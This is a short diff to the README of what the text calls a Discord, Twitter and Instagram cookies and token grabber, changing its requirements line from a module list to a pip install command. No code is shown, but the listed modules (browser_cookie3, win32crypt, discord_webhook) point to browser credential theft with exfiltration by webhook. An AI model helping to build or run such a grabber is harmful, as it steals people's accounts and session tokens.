@@ -20,7 +20,7 @@ Discord , Twitter, Instagram cookies and token grabber
 
 - Windows OS only
 - Python 3.x (unless it exe converted)
-- Modules: threadings, win32crypt, discord_webhook, subprocess, urllib.requests, requests, win32con, win32api, browser_cookie3 (unless it exe converted)
+- Modules: `$ pip install -r requirements.txt` (unless it exe converted)
 
 
 ## Screenshots
